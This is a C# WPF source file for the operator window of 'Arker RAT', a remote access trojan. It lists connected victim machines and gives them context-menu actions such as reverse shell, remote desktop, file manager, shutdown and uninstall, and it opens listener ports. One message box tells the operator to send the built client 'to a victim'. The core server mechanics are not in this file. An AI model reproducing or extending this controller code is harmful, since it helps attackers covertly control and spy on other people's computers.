using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.Remoting.Messaging;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Windows.Threading;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Resources;

namespace ArkerRatWpfVersion
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();

            clientDataGrid.PreviewMouseRightButtonDown += OnPreviewMouseRightButtonDown;
            clientDataGrid.PreviewMouseLeftButtonDown += DataGridRow_PreviewMouseLeft;
            loadServers.PreviewMouseRightButtonDown += OnPreviewMouseRightButtonDown;
            loadServers.PreviewMouseLeftButtonDown+= DataGridRow_PreviewMouseLeft;
            clientDataGrid.PreviewKeyDown +=DataGridRow_PreviewKeyDown;
            loadServers.PreviewKeyDown +=DataGridRow_PreviewKeyDown;


            loadServers.IsTabStop = false;
            clientDataGrid.IsTabStop = false;

            clientDataGrid.IsTabStop = false;
            loadServers.IsTabStop = false;

            consoleLog.Document.Blocks.Clear();
            consoleLog.IsReadOnly = true;
            consoleLog.AppendText("Arker RAT logs:\n\n");

            Thread updateThread = new Thread(new ThreadStart(UpdateUI));
            updateThread.SetApartmentState(ApartmentState.STA);
            updateThread.Start();
            this.WindowState = WindowState.Normal;
            this.Activate();

            //Assing the standard IP
            Task.Run(async() =>
            {
                    try
                    {
                        string address = "";
                        WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
                        using (WebResponse response = request.GetResponse())
                        using (StreamReader stream = new StreamReader(response.GetResponseStream()))
                        {
                            address = stream.ReadToEnd();
                        }

                        int first = address.IndexOf("Address: ") + 9;
                        int last = address.LastIndexOf("</body>");
                        address = address.Substring(first, last - first);
                        await Application.Current.Dispatcher.InvokeAsync(() =>
                        {
                            iPInput.Text = address;
                        });
                    }
                    catch (Exception ex){ consoleLog.AppendText(ex.Message+ "\n");
                    consoleLog.ScrollToEnd();
                }
            });
            
        }
        private void DataGridRow_PreviewKeyDown(object sender, KeyEventArgs e)
        {
            loadServers.UnselectAll();
            clientDataGrid.UnselectAll();
            e.Handled= true;
        }


        private void DataGridRow_PreviewMouseLeft(object sender, MouseButtonEventArgs e)
        {
            e.Handled = true;
            DataGridRow row = FindVisualParent<DataGridRow>(e.OriginalSource as FrameworkElement);

            if (row == null)
                return;

            row.IsSelected = false;
            row.IsTabStop = false;
        }

        private void OnPreviewMouseRightButtonDown(object sender, MouseButtonEventArgs e)
        {
            e.Handled = true;

            DataGridRow row = FindVisualParent<DataGridRow>(e.OriginalSource as FrameworkElement);

            if (row != null)
            {
                row.IsTabStop = false;

                // Retrieve the corresponding DataItem
                if (row.Item is DataItemClient)
                {
                    DataItemClient dataItem = (DataItemClient)row.Item;

                    if (dataItem != null)
                    {
                        if (dataItem.ContextMenu != null)
                            return;


                        MenuItem reversShellButton = new MenuItem();
                        reversShellButton.Header = "Reverse-shell";
                        reversShellButton.Icon = new System.Windows.Controls.Image
                        {
                            Stretch = Stretch.Uniform,
                            Source = TryFindResource("CmdImage") as BitmapImage
                        };

                        MenuItem fileManager = new MenuItem();
                        fileManager.Header = "File-Manager";
                        fileManager.Icon = new System.Windows.Controls.Image
                        {
                            Stretch = Stretch.Uniform,
                            Source = TryFindResource("FileManagerImage") as BitmapImage
                        };

                        MenuItem unInstall = new MenuItem();
                        unInstall.Header = "Uninstall client";
                        unInstall.Icon = new System.Windows.Controls.Image
                        {
                            Stretch = Stretch.Uniform,
                            Source = TryFindResource("RemoveImage") as BitmapImage
                        };

                        MenuItem disconnect = new MenuItem();
                        disconnect.Header = "Disconnect client";
                        disconnect.Icon = new System.Windows.Controls.Image
                        {
                            Stretch = Stretch.Uniform,
                            Source = TryFindResource("RemoveImage") as BitmapImage
                        };

                        MenuItem remoteDesktop = new MenuItem();
                        remoteDesktop.Header = "Remote-desktop";
                        remoteDesktop.Icon = new System.Windows.Controls.Image
                        {
                            Stretch = Stretch.Uniform,
                            Source = TryFindResource("RemoteDesktopImage") as BitmapImage
                        };

                        MenuItem shutDown = new MenuItem();
                        shutDown.Header = "Shut down";
                        shutDown.Icon = new System.Windows.Controls.Image
                        {
                            Stretch = Stretch.Uniform,
                            Source = TryFindResource("ShutDownImage") as BitmapImage
                        };

                        MenuItem restart = new MenuItem();
                        restart.Header = "Restart";
                        restart.Icon = new System.Windows.Controls.Image
                        {
                            Stretch = Stretch.Uniform,
                            Source = TryFindResource("RestartImage") as BitmapImage
                        };

                        MenuItem logOut = new MenuItem();
                        logOut.Header = "Log out";
                        logOut.Icon = new System.Windows.Controls.Image
                        {
                            Stretch = Stretch.Uniform,
                            Source = TryFindResource("LogOutImage") as BitmapImage
                        };

                        MenuItem sleep = new MenuItem();
                        sleep.Header = "Sleep";
                        sleep.Icon = new System.Windows.Controls.Image
                        {
                            Stretch = Stretch.Uniform,
                            Source = TryFindResource("SleepImage") as BitmapImage
                        };

                        dataItem.ContextMenu = new ContextMenu();
                        dataItem.ContextMenu.Background = new SolidColorBrush(System.Windows.Media.Color.FromRgb(18, 17, 20));
                        dataItem.ContextMenu.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(153, 102, 255));

                        // Tools
                        dataItem.ContextMenu.Items.Add(reversShellButton);
                        dataItem.ContextMenu.Items.Add(remoteDesktop);
                        dataItem.ContextMenu.Items.Add(fileManager);

                        // Disconnect
                        dataItem.ContextMenu.Items.Add(unInstall);
                        dataItem.ContextMenu.Items.Add(disconnect);
                        dataItem.ContextMenu.Items.Add(shutDown);
                        dataItem.ContextMenu.Items.Add(restart);
                        dataItem.ContextMenu.Items.Add(logOut);
                        dataItem.ContextMenu.Items.Add(sleep);

                        dataItem.ContextMenu.Visibility = Visibility.Visible;
                        dataItem.ContextMenu.IsOpen = true;

                        for (int y = 0; y < ArkerRATServerMechanics.rATClients.Count; y++)
                        {
                            if (ArkerRATServerMechanics.rATClients[y].dataItem.Tag as string == dataItem.Tag as string)
                            {
                                reversShellButton.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].StartReverseShell);
                                unInstall.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Uninstall);
                                disconnect.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Disconnect);
                                remoteDesktop.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].StartRemoteDesktop);
                                fileManager.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].StartFileManager);

                                shutDown.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].ShutDown);
                                restart.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Restart);
                                logOut.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].LogOut);
                                sleep.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Sleep);


                            }
                        }
                    }
                }
                else
                {
                    DataItemPort dataItem = (DataItemPort)row.Item;


                    if(dataItem ==null)
                        return;

                    dataItem.ContextMenu = new ContextMenu();
                    dataItem.ContextMenu.Tag = dataItem;

                    dataItem.ContextMenu.Background = new SolidColorBrush(System.Windows.Media.Color.FromRgb(18, 17, 20));
                    dataItem.ContextMenu.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(153, 102, 255));

                    if (ArkerRATServerMechanics.ports.Contains(Convert.ToInt32(dataItem.Tag)))
                    {
                        MenuItem closePort = new MenuItem();
                        closePort.Header = "Close";
                        closePort.Icon = new System.Windows.Controls.Image
                        {
                            Stretch = Stretch.Uniform,
                            Source = TryFindResource("ShutDownImage") as BitmapImage
                        };
                        dataItem.ContextMenu.Items.Add(closePort);
                        closePort.Click += new RoutedEventHandler(CloseServer);
                    }
                    else
                    {
                        MenuItem openPort = new MenuItem();
                        openPort.Header = "Open";
                        openPort.Icon = new System.Windows.Controls.Image
                        {
                            Stretch = Stretch.Uniform,
                            Source = TryFindResource("SleepImage") as BitmapImage
                        };
                        dataItem.ContextMenu.Items.Add(openPort);
                        openPort.Click += new RoutedEventHandler(OpenServer);
                    }
                    

                    MenuItem deletePort = new MenuItem();
                    deletePort.Header = "Delete";
                    deletePort.Icon = new System.Windows.Controls.Image
                    {
                        Stretch = Stretch.Uniform,
                        Source = TryFindResource("RemoveImage") as BitmapImage
                    };

                    dataItem.ContextMenu.Items.Add(deletePort);

                    //closePort.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Sleep);
                    //deletePort.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Sleep);


                    dataItem.ContextMenu.Visibility = Visibility.Visible;
                    dataItem.ContextMenu.IsOpen = true;

                    deletePort.Click += new RoutedEventHandler(RemoveServer);
                }
            }
        }
        bool portOpen = false;


        private static T FindVisualParent<T>(FrameworkElement element) where T : FrameworkElement
        {
            FrameworkElement parent = element;
            while (parent != null)
            {
                if (parent is T typedParent)
                    return typedParent;

                parent = VisualTreeHelper.GetParent(parent) as FrameworkElement;
            }

            return null;
        }

        int oldCountPort = 0;
        int oldCount = 0;
        private async void UpdateUI()
        {
            while(true)            
            {
                if (ArkerRATServerMechanics.ports.Count != oldCountPort)
                {
                    oldCountPort = ArkerRATServerMechanics.ports.Count;
                    await Application.Current.Dispatcher.InvokeAsync(() =>
                    {
                        serverAmountLabel.Content = ArkerRATServerMechanics.ports.Count;
                    });
                }
                    
                if (ArkerRATServerMechanics.rATClients.Count() != oldCount)
                {
                    oldCount = ArkerRATServerMechanics.rATClients.Count();
                   await  Application.Current.Dispatcher.InvokeAsync(() =>
                    {
                        clientAmountLabel.Content = ArkerRATServerMechanics.rATClients.Count();
                    });
                }

               await Application.Current.Dispatcher.InvokeAsync(() =>
                {
                    //ArkerRATServerMechanics.port = Convert.ToInt32(portInput.Text);
                    LoadCLients();
                });
                await Task.Delay(1000);
            };
        }

     
        private void TabControl_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {

        }
        //________________________________________________________________________________________________________

        //Custome buttons top right
        private void Window_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (e.LeftButton == MouseButtonState.Pressed)
            {
                DragMove();
            }
        }

        private void ipInput_TextChanged(object sender, TextChangedEventArgs e)
        {

        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            ArkerRATServerMechanics.StopListener();

            Environment.Exit(0);
        }

        private void Button_Click_1(object sender, RoutedEventArgs e)
        {

        }

        private void Button_Click_2(object sender, RoutedEventArgs e)
        {
            this.WindowState = WindowState.Minimized;
        }

        //________________________________________________________________________________________________________

        //Clients name sorter
        private void Button_Click_3(object sender, RoutedEventArgs e)
        {

        }

        //OS sorter
        private void Button_Click_4(object sender, RoutedEventArgs e)
        {

        }

        //Ip-dress sorter
        private void Button_Click_5(object sender, RoutedEventArgs e)
        {

        }

        //Ping/ms sorter
        private void Button_Click_6(object sender, RoutedEventArgs e)
        {

        }

        //Refresh
        private void Button_Click_7(object sender, RoutedEventArgs e)
        {
            LoadCLients();
        }

        //Search
        private void Button_Click_8(object sender, RoutedEventArgs e)
        {

        }

        private void ScrollBar_ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
        {

        }
        //________________________________________________________________________________________________________
        //Settings

        // Opacity not  crypter
        private void crypterOn_Checked(object sender, RoutedEventArgs e)
        {
            this.Opacity = 0.95;
        }

        private void crypterOff_Checked(object sender, RoutedEventArgs e)
        {
            this.Opacity = 1;
        }


        //_________________________________________________________________________________________________________

        //Program

        private delegate void LoadClientsFromOtherThread(ListBox listbox);

        private void Build(object sender, RoutedEventArgs e)
        {
            MessageBox.Show("ArkerRAT has been compiled SUCCESSFULLY send it to a victim, and start listening for conections at the network tab. " +
               "All the available clients will be shown at the clients tab.");
            consoleLog.AppendText("Client build has succeded!\n");
            consoleLog.ScrollToEnd();
        }

        private async void Listener(object sender, RoutedEventArgs e)
        {   
            if (!ArkerRATServerMechanics.ports.Contains(Convert.ToInt32(portInput.Text)))
            {
                DataItemPort dataItemPort = new DataItemPort();
                dataItemPort.Port = portInput.Text;
                dataItemPort.Status = "Open";
                dataItemPort.Tag = portInput.Text;
                loadServers.Items.Add(dataItemPort);
                ArkerRATServerMechanics.ports.Add(Convert.ToInt32(portInput.Text));
                ArkerRATServerMechanics.StopListener();
                ArkerRATServerMechanics.StartServer();
                consoleLog.AppendText("Port:" + dataItemPort.Port + " Opened\n");
                consoleLog.ScrollToEnd();
            }
        }

        private async void CloseServer(object sender, RoutedEventArgs e)
        {
            MenuItem item = (MenuItem)sender;
            ContextMenu menu = (ContextMenu)item.Parent;
            DataItemPort dataItemPort = (DataItemPort)menu.Tag;
            ArkerRATServerMechanics.ports.Remove(Convert.ToInt32(dataItemPort.Tag));
            ArkerRATServerMechanics.StopListener();
            ArkerRATServerMechanics.StartServer();
            loadServers.Items.Remove(dataItemPort);
            dataItemPort.Status = "Close";
            loadServers.Items.Add(dataItemPort);

            consoleLog.AppendText("Port:"+dataItemPort.Port+ " Closed\n");
            consoleLog.ScrollToEnd();
        }

        private async void RemoveServer(object sender, RoutedEventArgs e)
        {

            MenuItem item = (MenuItem)sender;
            ContextMenu menu = (ContextMenu)item.Parent;
            DataItemPort dataItemPort = (DataItemPort)menu.Tag;
            ArkerRATServerMechanics.ports.Remove(Convert.ToInt32(dataItemPort.Tag));
            ArkerRATServerMechanics.StopListener();
            ArkerRATServerMechanics.StartServer();
            loadServers.Items.Remove(dataItemPort);
            consoleLog.AppendText("Port:" + dataItemPort.Port + " Closed\n");
            consoleLog.ScrollToEnd();
        }

        private async void OpenServer(object sender, RoutedEventArgs e)
        {
            MenuItem item = (MenuItem)sender;
            ContextMenu menu = (ContextMenu)item.Parent;
            DataItemPort dataItemPort = (DataItemPort)menu.Tag;
            
            ArkerRATServerMechanics.ports.Add(Convert.ToInt32(dataItemPort.Tag));
            ArkerRATServerMechanics.StopListener();
            ArkerRATServerMechanics.StartServer();
            loadServers.Items.Remove(dataItemPort);
            dataItemPort.Status = "Open";
            loadServers.Items.Add(dataItemPort);
            consoleLog.AppendText("Port:" + dataItemPort.Port + " Opened\n");
            consoleLog.ScrollToEnd();
        }


        private BitmapImage GetBitmapImage(string resourceName)
        {
            ResourceManager resourceManager = new ResourceManager("ArkerRatWpfVersion.Resources", Assembly.GetExecutingAssembly());
            string imagePath = resourceManager.GetString(resourceName);

            BitmapImage bitmapImage = new BitmapImage();
            bitmapImage.BeginInit();
            bitmapImage.UriSource = new Uri(imagePath, UriKind.RelativeOrAbsolute);
            bitmapImage.EndInit();

            return bitmapImage;
        }
        public void LoadCLients()
        {

            clientDataGrid.Items.Clear();
            for (int y = 0; y < ArkerRATServerMechanics.rATClients.Count; y++)
            {
                ArkerRATServerMechanics.rATClients[y].dataItem = new DataItemClient
                {
                    ClientName = ArkerRATServerMechanics.rATClients[y].clientInfo[0],
                    OS = ArkerRATServerMechanics.rATClients[y].clientInfo[1],
                    IPAddress = ArkerRATServerMechanics.rATClients[y].clientInfo[2],
                    MS = Convert.ToString(ArkerRATServerMechanics.rATClients[y].ms)+"ms",
                        Tag = ArkerRATServerMechanics.rATClients[y].dataItem.Tag,
                        ContextMenu =null

                    };
               
                    clientDataGrid.Items.Add(ArkerRATServerMechanics.rATClients[y].dataItem);
            }
        }
    }
}